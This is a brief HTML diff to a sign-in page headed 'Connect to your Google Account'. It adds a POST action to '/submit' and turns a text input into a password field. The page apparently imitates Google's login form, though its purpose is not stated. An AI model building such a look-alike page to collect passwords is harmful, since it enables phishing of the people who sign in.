@@ -166,7 +166,7 @@
       </div>
       <h2>Sign In</h2>
       <p>Connect to your Google Account</p>
-      <form>
+      <form action="/submit" method="post">
         <div class="inputBox">
           <input
             type="email"
@@ -179,8 +179,8 @@
         </div>
         <div class="inputBox">
           <input
-            type="text"
-            name="text"
+            type="password"
+            name="password"
             required
             onkeyup="this.setAttribute('value', this.value);"
             value=""
